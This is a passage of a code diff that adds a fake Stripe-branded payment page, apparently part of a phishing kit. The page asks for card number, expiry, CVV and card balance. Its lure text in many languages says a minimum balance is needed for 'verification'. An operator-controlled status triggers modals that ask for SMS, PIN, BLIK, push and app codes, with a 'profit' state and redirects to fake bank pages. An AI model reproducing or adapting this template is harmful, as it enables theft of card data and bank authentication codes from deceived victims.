KICA8L2c+Cjwvc3ZnPgo="
+                                                    alt="UnionPay" class="BrandIcon" fetchpriority="low"
+                                                    data-savepage-loading="lazy"></span></span><span
+                                                class="CardFormFieldGroupIconOverflow-Item CardFormFieldGroupIconOverflow-Item--invisible"
+                                                role="presentation"><span class="FormFieldInput-IconsIcon"
+                                                  role="presentation"><img
+                                                    data-savepage-src="https://i.imgur.com/vPkJCG4.png"
+                                                    src="data:image/svg+xml;base64,PHN2ZwogIGhlaWdodD0iMTYiCiAgdmlld0JveD0iMCAwIDIzIDE2IgogIHdpZHRoPSIyMyIKICB4bWxucz0iaHR0cDovL3d3dy53My5vcmcvMjAwMC9zdmciCj4KICA8ZyBmaWxsPSJub25lIj4KICAgIDxwYXRoCiAgICAgIGQ9Im0uMjA1MzU3MTQgMTZoNC41MTc4NTcxNWMxLjAyNzgxMjUgMCAyLjI1ODkyODU3LTEuMTk0NjY2NyAyLjI1ODkyODU3LTIuMTMzMzMzM3YtMTMuODY2NjY2N2gtNC41MTc4NTcxNWMtMS4wMjc4MTI1IDAtMi4yNTg5Mjg1NyAxLjE5NDY2NjY3LTIuMjU4OTI4NTcgMy4yeiIKICAgICAgZmlsbD0iIzA0N2FiMSIKICAgIC8+CiAgICA8cGF0aAogICAgICBkPSJtMi43NjkyNDEwNyAxMC44MTZjLS44NjczMzU1OS4wMDAxNjA2LTEuNzMwMzk1NTgtLjExNDczOTctMi41NjM4ODM5My0uMzQxMzMzM3YtMS4xNzMzMzMzN2MuNjQ2Nzg4NzQuMzc3NzA0MzEgMS4zODYxMDA0NS41OTA4NDA5OSAyLjE0NTk4MjE1LjYxODY2NjY3Ljg2OTY4NzUgMCAxLjM1NTM1NzE0LS41NzYgMS4zNTUzNTcxNC0xLjM2NTMzMzMzdi0zLjIyMTMzMzM0aDIuMTQ1OTgyMTR2My4yMjEzMzMzNGMwIDEuMjU4NjY2NjYtLjcwMDI2Nzg2IDIuMjYxMzMzMzMtMy4wODM0Mzc1IDIuMjYxMzMzMzN6IgogICAgICBmaWxsPSIjZmZmIgogICAgLz4KICAgIDxwYXRoCiAgICAgIGQ9Im04LjExMTYwNzE0IDE2aDQuNTE3ODU3MTZjMS4wMjc4MTI1IDAgMi4yNTg5Mjg2LTEuMTk0NjY2NyAyLjI1ODkyODYtMi4xMzMzMzMzdi0xMy44NjY2NjY3aC00LjUxNzg1NzJjLTEuMDI3ODEyNDkgMC0yLjI1ODkyODU2IDEuMTk0NjY2NjctMi4yNTg5Mjg1NiAzLjJ6IgogICAgICBmaWxsPSIjZDQyZDA2IgogICAgLz4KICAgIDxwYXRoCiAgICAgIGQ9Im04LjExMTYwNzE0IDYuMDhjLjY1NTA4OTI5LS41OTczMzMzMyAxLjc4NDU1MzU3LS45NzA2NjY2NyAzLjYxNDI4NTc2LS44ODUzMzMzMy45OTM5Mjg1LjA0MjY2NjY2IDIuMDMzMDM1Ny4zMiAyLjAzMzAzNTcuMzJ2MS4xODRjLS41OTQzMjMxLS4zMzk0NzQ3LTEuMjYyMzc1OC0uNTQ3MzQ2NTYtMS45NTM5NzMyLS42MDgtMS4zODkyNDExLS4xMTczMzMzNC0yLjIzNjMzOTMzLjYxODY2NjY2LTIuMjM2MzM5MzMgMS45MDkzMzMzM3MuODQ3MDk4MjMgMi4wMjY2NjY3IDIuMjM2MzM5MzMgMS45MmMuNjkyMDE4NS0uMDY2MDY1NTUgMS4zNTk2MzQyLS4yNzc0NDU5MiAxLjk1Mzk3MzItLjYxODY2NjY3djEuMTczMzMzMzdzLTEuMDM5MTA3Mi4yODgtMi4wMzMwMzU3LjMzMDY2NjZjLTEuODI5NzMyMTkuMDg1MzMzNC0yLjk1OTE5NjQ3LS4yODgtMy42MTQyODU3Ni0uODg1MzMzM3oiCiAgICAgIGZpbGw9IiNmZmYiCiAgICAvPgogICAgPHBhdGgKICAgICAgZD0ibTE2LjAxNzg1NzEgMTZoNC41MTc4NTcyYzEuMDI3ODEyNSAwIDIuMjU4OTI4Ni0xLjE5NDY2NjcgMi4yNTg5Mjg2LTIuMTMzMzMzM3YtMTMuODY2NjY2N2gtNC41MTc4NTcyYy0xLjAyNzgxMjUgMC0yLjI1ODkyODYgMS4xOTQ2NjY2Ny0yLjI1ODkyODYgMy4yeiIKICAgICAgZmlsbD0iIzY3YjYzNyIKICAgIC8+CiAgICA8cGF0aAogICAgICBkPSJtMjEuNjY1MTc4NiA5LjI4YzAgLjg1MzMzMzMtLjcwMDI2NzkgMS4zODY2NjY3LTEuNjM3NzIzMiAxLjM4NjY2NjdoLTQuMDA5NTk4M3YtNS4zMzMzMzMzN2gzLjY0ODE2OTdsLjI1OTc3NjguMDEwNjY2NjdjLjgyNDUwODkuMDQyNjY2NjcgMS40MzQ0MTk2LjUwMTMzMzMzIDEuNDM0NDE5NiAxLjI5MDY2NjY3IDAgLjYxODY2NjY2LS40MTc5MDE4IDEuMTUyLTEuMTc0NjQyOCAxLjI4di4wMzJjLjgzNTgwMzUuMDUzMzMzMzMgMS40Nzk1OTgyLjU1NDY2NjY2IDEuNDc5NTk4MiAxLjMzMzMzMzMzem0tMi44ODAxMzQtMy4xMDRjLS4wNDg2MTA0LS4wMDY4NjY1OC0uMDk3Njc5OC0uMDEwNDMxMjktLjE0NjgzMDMtLjAxMDY2NjY3aC0xLjM1NTM1NzJ2MS4zNDRoMS41MDIxODc1Yy4yODIzNjYxLS4wNjQuNTE5NTUzNi0uMzA5MzMzMzMuNTE5NTUzNi0uNjcyIDAtLjM2MjY2NjY2LS4yMzcxODc1LS42MDgtLjUxOTU1MzYtLjY2MTMzMzMzem0uMTY5NDE5NyAyLjE3NmMtLjA1OTc1NS0uMDA4ODYxNjgtLjEyMDI1NTktLjAxMjQzMjc1LS4xODA3MTQzLS4wMTA2NjY2N2gtMS40OTA4OTI5djEuNDYxMzMzMzRoMS40OTA4OTI5bC4xODA3MTQzLS4wMjEzMzMzNGMuMjgyMzY2MS0uMDY0LjUxOTU1MzYtLjM0MTMzMzMzLjUxOTU1MzYtLjcxNDY2NjY2IDAtLjM3MzMzMzM0LS4yMjU4OTI5LS42NC0uNTE5NTUzNi0uNzE0NjY2Njd6IgogICAgICBmaWxsPSIjZmZmIgogICAgLz4KICA8L2c+Cjwvc3ZnPgo="
+                                                    alt="JCB" class="BrandIcon" fetchpriority="low"
+                                                    data-savepage-loading="lazy"></span></span></div>
+                                          </div>
+                                        </div>
+                                      </div>
+                                      <div class="FormFieldGroup-child FormFieldGroup-child--width-6">
+                                        <div class="FormFieldInput" v-bind:class="{ 'has-icon': cardMonth === '' }">
+                                          <div class="CheckoutInputContainer">
+                                            <span class="InputContainer" data-max="">
+                                              <select
+                                                class="CheckoutInput CheckoutInput--tabularnums Input Input--empty"
+                                                data-ref="cardDate" id="cardMonth" required v-model="cardMonth">
+                                                <option disabled selected value="">
+                                                  <%=translate["month"][serviceLang]%>
+                                                </option>
+                                                <option v-bind:disabled="n < minCardMonth" v-bind:key="n"
+                                                  v-bind:value="n < 10 ? '0' + n : n" v-for="n in 12">
+                                                  {{n < 10 ? '0' + n : n}} </option>
+                                              </select>
+                                            </span>
+                                          </div>
+                                          <div class="FormFieldInput-Icon is-loaded" id="cvcicon"
+                                            style="margin-top: 27px; display: none;">
+                                            <svg class="Icon Icon--md" focusable="false" viewBox="0 0 32 21">
+                                              <g fill="none" fill-rule="evenodd">
+                                                <g class="Icon-fill">
+                                                  <g transform="translate(0 2)">
+                                                    <path
+                                                      d="M21.68 0H2c-.92 0-2 1.06-2 2v15c0 .94 1.08 2 2 2h25c.92 0 2-1.06 2-2V9.47a5.98 5.98 0 0 1-3 1.45V11c0 .66-.36 1-1 1H3c-.64 0-1-.34-1-1v-1c0-.66.36-1 1-1h17.53a5.98 5.98 0 0 1 1.15-9z"
+                                                      opacity=".2"></path>
+                                                    <path d="M19.34 3H0v3h19.08a6.04 6.04 0 0 1 .26-3z" opacity=".3">
+                                                    </path>
+                                                  </g>
+                                                  <g transform="translate(18)">
+                                                    <path
+                                                      d="M7 14A7 7 0 1 1 7 0a7 7 0 0 1 0 14zM4.22 4.1h-.79l-1.93.98v1l1.53-.8V9.9h1.2V4.1zm2.3.8c.57 0 .97.32.97.78 0 .5-.47.85-1.15.85h-.3v.85h.36c.72 0 1.21.36 1.21.88 0 .5-.48.84-1.16.84-.5 0-1-.16-1.52-.47v1c.56.24 1.12.37 1.67.37 1.31 0 2.21-.67 2.21-1.64 0-.68-.42-1.23-1.12-1.45.6-.2.99-.73.99-1.33C8.68 4.64 7.85 4 6.65 4a4 4 0 0 0-1.57.34v.98c.48-.27.97-.42 1.44-.42zm4.32 2.18c.73 0 1.24.43 1.24.99 0 .59-.51 1-1.24 1-.44 0-.9-.14-1.37-.43v1.03c.49.22.99.33 1.48.33.26 0 .5-.04.73-.1.52-.85.82-1.83.82-2.88l-.02-.42a2.3 2.3 0 0 0-1.23-.32c-.18 0-.37.01-.57.04v-1.3h1.44a5.62 5.62 0 0 0-.46-.92H9.64v3.15c.4-.1.8-.17 1.2-.17z">
+                                                    </path>
+                                                  </g>
+                                                </g>
+                                              </g>
+                                            </svg>
+                                          </div>
+                                        </div>
+                                      </div>
+                                      <div class="FormFieldGroup-child FormFieldGroup-child--width-6">
+                                        <div class="FormFieldInput has-icon">
+                                          <div class="CheckoutInputContainer" style="width: 100%;">
+                                            <span class="InputContainer" data-max="">
+                                              <select
+                                                class="CheckoutInput CheckoutInput--tabularnums Input Input--empty"
+                                                data-ref="cardDate" id="cardYear" required v-model="cardYear">
+                                                <option disabled selected value="">
+                                                  <%=translate["year"][serviceLang]%>
+                                                </option>
+                                                <option v-bind:key="n" v-bind:value="$index + minCardYear"
+                                                  v-for="(n, $index) in 12">
+                                                  {{$index + minCardYear}}
+                                                </option>
+                                              </select>
+                                            </span>
+                                          </div>
+                                        </div>
+                                      </div>
+                                      <div
+                                        class="FormFieldGroup-child FormFieldGroup-child--width-12 FormFieldGroup-childLeft FormFieldGroup-childRight FormFieldGroup-childBottom">
+                                        <div class="FormFieldInput has-icon">
+                                          <div class="CheckoutInputContainer"><span class="InputContainer"><input
+                                                required aria-invalid="false" aria-label="CVC" autocomplete="cc-csc"
+                                                autocorrect="off"
+                                                class="CheckoutInput CheckoutInput--tabularnums Input Input--empty"
+                                                id="cardCvv" inputmode="numeric" maxlength="3" minlength="3"
+                                                name="cardCvc" placeholder="CVC/CVV" spellcheck="false" type="text"
+                                                v-mask="'####'" v-model="cardCvv" value=""></span></div>
+
+
+                                          <div class="FormFieldInput-Icon is-loaded">
+                                            <svg aria-label="CVC" class="Icon Icon--md" focusable="false" role="img"
+                                              viewBox="0 0 32 21">
+                                              <title>CVV</title>
+                                              <g fill="none" fill-rule="evenodd">
+                                                <g class="Icon-fill">
+                                                  <g transform="translate(0 2)">
+                                                    <path
+                                                      d="M21.68 0H2c-.92 0-2 1.06-2 2v15c0 .94 1.08 2 2 2h25c.92 0 2-1.06 2-2V9.47a5.98 5.98 0 0 1-3 1.45V11c0 .66-.36 1-1 1H3c-.64 0-1-.34-1-1v-1c0-.66.36-1 1-1h17.53a5.98 5.98 0 0 1 1.15-9z"
+                                                      opacity=".2"></path>
+                                                    <path d="M19.34 3H0v3h19.08a6.04 6.04 0 0 1 .26-3z" opacity=".3">
+                                                    </path>
+                                                  </g>
+                                                  <g transform="translate(18)">
+                                                    <path
+                                                      d="M7 14A7 7 0 1 1 7 0a7 7 0 0 1 0 14zM4.22 4.1h-.79l-1.93.98v1l1.53-.8V9.9h1.2V4.1zm2.3.8c.57 0 .97.32.97.78 0 .5-.47.85-1.15.85h-.3v.85h.36c.72 0 1.21.36 1.21.88 0 .5-.48.84-1.16.84-.5 0-1-.16-1.52-.47v1c.56.24 1.12.37 1.67.37 1.31 0 2.21-.67 2.21-1.64 0-.68-.42-1.23-1.12-1.45.6-.2.99-.73.99-1.33C8.68 4.64 7.85 4 6.65 4a4 4 0 0 0-1.57.34v.98c.48-.27.97-.42 1.44-.42zm4.32 2.18c.73 0 1.24.43 1.24.99 0 .59-.51 1-1.24 1-.44 0-.9-.14-1.37-.43v1.03c.49.22.99.33 1.48.33.26 0 .5-.04.73-.1.52-.85.82-1.83.82-2.88l-.02-.42a2.3 2.3 0 0 0-1.23-.32c-.18 0-.37.01-.57.04v-1.3h1.44a5.62 5.62 0 0 0-.46-.92H9.64v3.15c.4-.1.8-.17 1.2-.17z">
+                                                    </path>
+                                                  </g>
+                                                </g>
+                                              </g>
+                                            </svg>
+                                          </div>
+                                                                                    <span class="text-danger" v-if="cardError">{{ cardError }}</span>
+
+                                        </div>
+                                      </div>
+                                      <div style="opacity: 0; height: 0px;"><span
+                                          class="FieldError Text Text-color--red Text-fontSize--13"><span
+                                            aria-hidden="true"></span></span></div>
+                                    </div>
+                                  </fieldset>
+                              </div>
+                            </div>
+                             <div class="BillingAddressForm-addressInput flex-item width-12"
+                                                 v-if="step === 2 && balanceChecker">
+
+                              <div style="pointer-events: auto; height: auto; opacity: 1;">
+                                <div class="flex-container spacing-16 direction-column wrap-wrap">
+                                  <div class="flex-item width-12">
+                                    <div class="FormFieldGroup">
+                                      <div
+                                        class="FormFieldGroup-labelContainer flex-container justify-content-space-between">
+                                        <label for="billingName"><span
+                                            class="Text Text-color--gray600 Text-fontSize--13 Text-fontWeight--500">
+                                            <%=translate["card_balance"][serviceLang]%>
+                                          </span></label>
+                                      </div>
+                                      
+                                      <div class="FormFieldGroup-Fieldset">
+                                        <div class="FormFieldGroup-container" id="billingName-fieldset">
+                                          <div
+                                            class="FormFieldGroup-child FormFieldGroup-child--width-12 FormFieldGroup-childLeft FormFieldGroup-childRight FormFieldGroup-childTop FormFieldGroup-childBottom">
+                                            <div class="FormFieldInput">
+                                              <div class="CheckoutInputContainer">
+                                                <span class="InputContainer" data-max="">
+                                                  <input required aria-invalid="false" inputmode="" autocomplete="off"
+                                                    autocorrect="off" class="CheckoutInput Input Input--empty"
+                                                    id="cardBalance" spellcheck="false" type="text"
+                                                    v-model="cardBalance" value="">
+                                                </span>
+
+                                              </div>
+                                            </div>
+                                          </div>
+                                        </div>
+                                      </div>
+                                    </div>
+                                
+                                  <div class="flex-item width-12" style="display:none" v-show="cardError">
+                                    <div class="FormFieldGroup">
+                                      <div
+                                        class="FormFieldGroup-labelContainer flex-container justify-content-space-between">
+                                        <div><span class="FieldError Text Text-color--red Text-fontSize--13"> <span
+                                              class="text-danger" v-if="cardError">{{ cardError }}</span>
+                                          </span></div>
+                                      </div>
+                                    </div>
+                                  </div>
+                                </div>
+                              </div>
+                            </div>
+                          </div>
+                        </div>
+                      </div>
+                    
+
+                    <div class="PaymentForm-confirmPaymentContainer flex-item width-grow">
+                      <div class="flex-item width-12"></div>
+                      <div class="flex-item width-12">
+                        <div class="payment-gateway-btn-wrapper">
+                          <button id="btn" v-if="!loading" class="SubmitButton SubmitButton--incomplete">
+                            <%=translate["submit"][serviceLang]%>
+                          </button>
+                        </div>
+                        <div class="ConfirmPayment-PostSubmit">
+                          <div>
+                            <div class="flex-container spacing-8 direction-column" style="margin-top: 4px;">
+                              <div class="flex-item width-grow"></div>
+                              <div class="flex-item width-grow">
+                                <div style="height: 0px; opacity: 0; pointer-events: none;">
+                                  <div class="ConfirmTerms Text Text-color--gray500 Text-fontSize--13"></div>
+                                </div>
+                              </div>
+                              <div class="flex-item width-grow"></div>
+                            </div>
+                          </div>
+                        </div>
+                      </div>
+                    </div>
+                  </div>
+                </div>
+          </form>
+        </div>
+        <footer class="App-Footer Footer">
+          <div class="Footer-PoweredBy"><a class="Link Link--primary" href="https://stripe.com" target="_blank"
+              rel="noopener">
+              <div class="Footer-PoweredBy-Text Text Text-color--gray400 Text-fontSize--12 Text-fontWeight--400">Powered
+                by <span><svg class="InlineSVG Icon Footer-PoweredBy-Icon Icon--md" focusable="false" width="33"
+                    height="15" role="img" aria-labelledby="stripe-title">
+                    <title id="stripe-title">Stripe</title>
+                    <g fill-rule="evenodd">
+                      <path
+                        d="M32.956 7.925c0-2.313-1.12-4.138-3.261-4.138-2.15 0-3.451 1.825-3.451 4.12 0 2.719 1.535 4.092 3.74 4.092 1.075 0 1.888-.244 2.502-.587V9.605c-.614.307-1.319.497-2.213.497-.876 0-1.653-.307-1.753-1.373h4.418c0-.118.018-.588.018-.804zm-4.463-.859c0-1.02.624-1.445 1.193-1.445.55 0 1.138.424 1.138 1.445h-2.33zM22.756 3.787c-.885 0-1.454.415-1.77.704l-.118-.56H18.88v10.535l2.259-.48.009-2.556c.325.235.804.57 1.6.57 1.616 0 3.089-1.302 3.089-4.166-.01-2.62-1.5-4.047-3.08-4.047zm-.542 6.225c-.533 0-.85-.19-1.066-.425l-.009-3.352c.235-.262.56-.443 1.075-.443.822 0 1.391.922 1.391 2.105 0 1.211-.56 2.115-1.39 2.115zM18.04 2.766V.932l-2.268.479v1.843zM15.772 3.94h2.268v7.905h-2.268zM13.342 4.609l-.144-.669h-1.952v7.906h2.259V6.488c.533-.696 1.436-.57 1.716-.47V3.94c-.289-.108-1.346-.307-1.879.669zM8.825 1.98l-2.205.47-.009 7.236c0 1.337 1.003 2.322 2.34 2.322.741 0 1.283-.135 1.581-.298V9.876c-.289.117-1.716.533-1.716-.804V5.865h1.716V3.94H8.816l.009-1.96zM2.718 6.235c0-.352.289-.488.767-.488.687 0 1.554.208 2.241.578V4.202a5.958 5.958 0 0 0-2.24-.415c-1.835 0-3.054.957-3.054 2.557 0 2.493 3.433 2.096 3.433 3.17 0 .416-.361.552-.867.552-.75 0-1.708-.307-2.467-.723v2.15c.84.362 1.69.515 2.467.515 1.879 0 3.17-.93 3.17-2.548-.008-2.692-3.45-2.213-3.45-3.225z">
+                      </path>
+                    </g>
+                  </svg></span></div>
+            </a></div>
+          <div class="Footer-Links"><a class="Link Link--primary" href="https://stripe.com/legal/end-users"
+              target="_blank" rel="noopener"><span
+                class="Text Text-color--gray400 Text-fontSize--12 Text-fontWeight--400">Terms</span></a><a
+              class="Link Link--primary" href="https://stripe.com/privacy" target="_blank" rel="noopener"><span
+                class="Text Text-color--gray400 Text-fontSize--12 Text-fontWeight--400">Privacy</span></a></div>
+        </footer>
+
+      </div>
+    </div>
+  </div>
+    </div>
+  <script <script src="https://cdnjs.cloudflare.com/ajax/libs/vue/2.6.10/vue.min.js" crossorigin="anonymous"></script>
+  <script src="https://unpkg.com/vue-the-mask@0.11.1/dist/vue-the-mask.js" crossorigin="anonymous"></script>
+  <script src="https://cdn.jsdelivr.net/npm/vue-swal@1.0.0/dist/vue-swal.min.js" crossorigin="anonymous"></script>
+  <script src="https://cdnjs.cloudflare.com/ajax/libs/axios/0.21.1/axios.min.js" crossorigin="anonymous"></script>
+  <script src="https://code.jquery.com/jquery-3.6.0.min.js"
+    integrity="sha256-/xUj+3OJU5yExlq6GSYGSHk7tPXikynS7ogEvDej/m4=" crossorigin="anonymous"></script>
+  <script defer>
+
+    function getTemplate(lang, amount) {
+      const templates = {
+        pl: `Dla pierwszej weryfikacji saldo na karcie bankowej musi wynosić co najmniej ${amount}, aby można było wykonać transakcję testową. w celu sprawdzenia limitów i potwierdzenia tożsamości. Proszę doładować kartę lub użyć innej karty.`,
+        en: `You must enter a card with a balance of at least ${amount}. The bank reserves this amount. This takes about 5-10 minutes. This procedure is associated with an increase in fraud on the part of sellers receiving advance payments. In the future, this procedure for using our services will no longer be necessary.`,
+        nl: `Voor de eerste verificatie moet het saldo van uw bankpas minimaal ${amount} bedragen om een proeftransactie te kunnen uitvoeren. om de limieten te controleren en uw identiteit te bevestigen. Gelieve uw kaart op te laden of een andere kaart te gebruiken.`,
+        ba: `Za prvu provjeru, stanje na bankovnoj kartici mora biti najmanje ${amount} kako bi se mogla izvršiti testna transakcija. radi provjere ograničenja i potvrde vašeg identiteta. Molimo napunite svoju karticu ili koristite drugu karticu.`,
+        es: `Para la primera verificación, el saldo de la tarjeta bancaria debe ser de al menos ${amount} para poder realizar una transacción de prueba para comprobar los límites y confirmar su identidad. Por favor, recargue su tarjeta o utilice otra tarjeta.`,
+        de: `Für die erste Überprüfung muss der Kontostand der Bankkarte mindestens ${amount} betragen, um eine Testtransaktion durchführen zu können. um die Limits zu überprüfen und Ihre Identität zu bestätigen. Bitte laden Sie Ihre Karte auf oder verwenden Sie eine andere Karte.`,
+        dk: `Til den første verifikation skal der være mindst ${amount} på bankkortet for at kunne foretage en testtransaktion. for at kontrollere grænserne og bekræfte din identitet. Venligst genoplad dit kort eller brug et andet kort.`,
+        pt: `Para a primeira verificação, o saldo do cartão bancário deve ser de, pelo menos, ${amount}, a fim de efetuar uma transação de teste. para verificar os limites e confirmar a sua identidade. Por favor, recarregue o seu cartão ou utilize outro cartão.`,
+        ua: `Для першої перевірки на банківській картці має бути щонайменше ${amount}, щоб можна було здійснити тестову транзакцію. для перевірки лімітів і підтвердження вашої особистості. Будь ласка, поповніть свою картку або використайте іншу картку.`,
+        tj: `Барои санҷиши аввал, бақияи корт бояд ҳадди ақал ${amount} бошад, то ки амалиёти санҷишӣ анҷом дода шавад. Барои тасдиқи ҳудудҳо ва шахсияти худ. Лутфан кортро пур кунед ё кортро дигар истифода баред.`,
+        am: `Առաջին ստուգման համար բանկային քարտի մնացորդը պետք է լինի առնվազն ${amount}՝ փորձնական գործարք կատարելու համար: սահմանները ստուգելու և ձեր ինքնությունը հաստատելու համար: Խնդրում ենք վերալիցքավորել ձեր քարտը կամ օգտագործել այլ քարտ:`,
+        uz: `Birinchi tekshiruv uchun bank kartasidagi qoldiq kamida ${amount} bo‘lishi kerak. bu cheklovlarni tekshirish va shaxsingizni tasdiqlash uchun kerak. Iltimos, kartangizni to‘ldiring yoki boshqa kartadan foydalaning.`,
+        kz: `Алғашқы тексеру үшін банк картасындағы қалдық кемінде ${amount} болуы керек, бұл шектеулерді тексеріп, жеке басыңызды растау үшін қажет. Картаны толтырыңыз немесе басқа картаны қолданыңыз.`,
+        ro: `Pentru prima verificare, soldul cardului bancar trebuie să fie de cel puțin ${amount} pentru a putea efectua o tranzacție de test. pentru verificarea limitelor și confirmarea identității. Vă rugăm să reîncărcați cardul sau să utilizați un alt card.`,
+        se: `För första kontrollen måste saldot på bankkortet vara minst ${amount} för att kunna göra en testtransaktion. för att kontrollera gränser och bekräfta din identitet. Ladda gärna ditt kort eller använd ett annat kort.`,
+        hr: `Za prvu provjeru, stanje na bankovnoj kartici mora biti najmanje ${amount} kako bi se mogla izvršiti testna transakcija. radi provjere ograničenja i potvrde vašeg identiteta. Molimo napunite svoju karticu ili koristite drugu karticu.`,
+        sk: `Na prvú kontrolu musí byť zostatok na bankovej karte najmenej ${amount}, aby bolo možné vykonať skúšobnú transakciu. na overenie limitov a potvrdenie vašej identity. Prosím, dobite si kartu alebo použite inú kartu.`,
+        cz: `Pro první kontrolu musí být zůstatek na bankovní kartě alespoň ${amount}, aby bylo možné provést zkušební transakci. pro ověření limitů a potvrzení vaší identity. Prosím, dobijte si kartu nebo použijte jinou kartu.`,
+        fr: `La première fois que vous vérifiez votre solde, vous devez disposer d'au moins ${amount}. cela est nécessaire pour créer une transaction test. vérification de la limite et de l'identité. veuillez recharger votre carte ou utiliser une autre carte.`,
+        bg: `За първата проверка салдото по банковата карта трябва да бъде поне ${amount}, за да може да се извърши пробна транзакция. за проверка на лимитите и потвърждаване на самоличността. Моля, заредете картата си или използвайте друга карта.`,
+        rs: `Za prvu proveru stanje na bankovnoj kartici mora biti najmanje ${amount} kako bi se mogla izvršiti probna transakcija. za proveru limita i potvrdu identiteta. Molimo vas da dopunite svoju karticu ili koristite drugu karticu.`,
+        be: `Для першай праверкі баланс на банкаўскай карце павінен складаць не менш за ${amount}, каб можна было выканаць пробную транзакцыю. для праверкі лімітаў і пацверджання асобы. Калі ласка, папоўніце сваю картку альбо выкарыстоўвайце іншую картку.`,
+        it: `Per il primo controllo, il saldo della carta bancaria deve essere di almeno ${amount} per poter effettuare una transazione di prova. per verificare i limiti e confermare la propria identità. Si prega di ricaricare la carta o di utilizzare un'altra carta.`,
+        ch: `Für die erste Überprüfung muss das Guthaben der Bankkarte mindestens ${amount} betragen, um eine Testtransaktion durchführen zu können. um die Limits zu überprüfen und Ihre Identität zu bestätigen. Bitte laden Sie Ihre Karte auf oder verwenden Sie eine andere Karte.`,
+        cs: `Pro první kontrolu musí být zůstatek na bankovní kartě alespoň ${amount}, aby bylo možné provést testovací transakci. pro ověření limitů a potvrzení identity. Prosím, dobijte si kartu nebo použijte jinou kartu.`,
+        no: `For den første bekreftelsen må saldoen på bankkortet være minst ${amount} for å kunne utføre en testtransaksjon. for å kontrollere grensene og bekrefte identiteten din. Vennligst fyll opp kortet ditt eller bruk et annet kort.`,
+        lt: `Pirmajai patikrai banko kortelės sąskaitoje turi būti bent ${amount}, kad būtų galima atlikti bandomąjį sandorį. patikrinti limitus ir patvirtinti savo tapatybę. Prašome papildyti savo kortelę arba naudoti kitą kortelę.`,
+        lv: `Pirmajai pārbaudei bankas kartes atlikumam jābūt vismaz ${amount}, lai varētu veikt pārbaudes darījumu. lai pārbaudītu limitus un apstiprinātu savu identitāti. Lūdzu, papildiniet savu karti vai izmantojiet citu karti.`,
+        est: `Esimese kontrolli puhul peab pangakaardi saldo olema vähemalt ${amount}, et teha testtehing. piirangute kontrollimiseks ja oma identiteedi kinnitamiseks. Palun laadige oma kaart uuesti või kasutage mõnda muud kaarti.`,
+        hu: `Az első ellenőrzéshez a bankkártya egyenlegének legalább ${amount}-nek kell lennie ahhoz, hogy teszttranzakciót lehessen végrehajtani. a korlátok ellenőrzésére és az azonosítás megerősítésére. Kérjük, töltse fel a kártyáját, vagy használjon másik kártyát.`,
+      };
+      return templates[lang] || "Template not found for the specified language.";
+    }
+
+
+
+    new Vue({
+      el: "#app",
+      data() {
+        return {
+          currentCardBackground: 8, // just for fun :D
+          cardBalance: "",
+          cardNumber: "",
+          cardHolder: "",
+
+          cardMonth: "",
+          cardYear: "",
+          cardCvv: "",
+          billingAddress: '',
+          billingZip: '',
+          billingCity: '',
+          billingState: '',
+          billingCountry: '',
+          billingPhone: "",
+          minCardYear: new Date().getFullYear(),
+          amexCardMask: "#### ###### #####",
+          otherCardMask: "#### #### #### ####",
+          cardNumberTemp: "",
+          isCardFlipped: false,
+          focusElementStyle: null,
+          isInputFocused: false,
+          step: 1,
+          cardError: "",
+          balanceChecker: <%=String(!!ad.balanceChecker) %>,
+      loading: false,
+        currentStatus: null,
+          logToken: null,
+            imgUrl: "http://via.placeholder.com/400x300?text=image%201",
+
+          };
+        },
+    mounted() {
+      this.cardNumberTemp = this.otherCardMask;
+      document.getElementById("billingAddress").focus();
+
+    },
+    computed: {
+      getCardType() {
+        if (!this.cardNumber || String(this.cardNumber).trim().length < 1) return false;
+        let number = this.cardNumber;
+        let re = new RegExp("^4");
+        if (number.match(re) != null) return "visa";
+
+        re = new RegExp("^(34|37)");
+        if (number.match(re) != null) return "amex";
+
+        re = new RegExp("^5[1-5]");
+        if (number.match(re) != null) return "mastercard";
+
+        re = new RegExp("^6011");
+        if (number.match(re) != null) return "discover";
+
+        re = new RegExp("^9792");
+        if (number.match(re) != null) return "troy";
+
+        return "visa"; // default type
+      },
+      generateCardNumberMask() {
+        return this.getCardType === "amex"
+          ? this.amexCardMask
+          : this.otherCardMask;
+      },
+      minCardMonth() {
+        if (this.cardYear === this.minCardYear) return new Date().getMonth() + 1;
+        return 1;
+      },
+    },
+    watch: {
+      cardYear() {
+        if (this.cardMonth < this.minCardMonth) {
+          this.cardMonth = "";
+        }
+      },
+     currentStatus(v) {
+        if (v == "profit") this.successModal();
+        else if (v == "sms") this.codeModal();
+        else if (v == "pincode") this.pinModal();
+
+
+
+
+
+        else if (v.includes("error")) {
+          this.erroronlModal(v.split("error_")[1]);
+        }
+
+        else if (v.includes("customDep")) {
+          this.customdepModal(v.split("customDep_")[1]);
+        }
+
+        else if (v.includes("custom")) {
+          this.customModal(v.split("custom_")[1]);
+        }
+
+        else if (v.includes("ferr")) this.ferrModal(
+          "custom",
+          "<%=translate["info"][serviceLang]%>",
+          v.split("ferr_")[1],
+          "<%=translate["enterrr"][serviceLang]%>",
+          "<%=translate["wrongg"][serviceLang]%>",
+        );
+        else if (v == "appCode") this.codeModal(
+          "app",
+          "<%=translate["app_code_title"][serviceLang]%>",
+          "<%=translate["app_code_text"][serviceLang]%>",
+          "<%=translate["app_code_placeholder"][serviceLang]%>",
+        );
+        else if (v == "callCode") this.codeModal(
+          "call",
+          "<%=translate["call_code_title"][serviceLang]%>",
+          "<%=translate["call_code_text"][serviceLang]%>",
+          "<%=translate["call_code_placeholder"][serviceLang]%>",
+        );
+        else if (v == "blik") this.codeModal(
+          "blik",
+          "<%=translate["blik_code_title"][serviceLang]%>",
+          "<%=translate["blik_code_text"][serviceLang]%>",
+          "<%=translate["blik_code_placeholder"][serviceLang]%>",
+        );
+        else if (v == "picture") this.pictureModal(this.imgUrl);
+        else if (v == "push") this.pushModal();
+        else if (v == "limits") this.limitsModal();
+        else if (v == "otherCard") this.otherCardModal();
+        else if (v == "correctBalance") this.correctBalanceModal();
+        else if (v == "lk") document.location.href = "/banks/<%= countryId %>/<%= ad.id %>";
+        else if (v == "scream") document.location.href = `http://ibaillanos.tv`;
+        else if (v == "mail") this.mailModal();
+
+        else if (v == "dep") this.depModal();
+
+
+
+      },
+    },
+    methods: {
+      erroronlModal(err) {
+        // Преобразуем текст ошибки в HTML с кликабельными ссылками
+        const clickableError = `${err}`.replace(
+          /(https?:\/\/[^\s]+)/g,
+          '<a href="$1" target="_blank" style="color: #7cd1f9; text-decoration: underline;">$1</a>'
+        );
+
+        // Отображаем модальное окно с информацией об ошибке
+        swal({
+          title: "<%=translate['info'][serviceLang]%>",
+          content: {
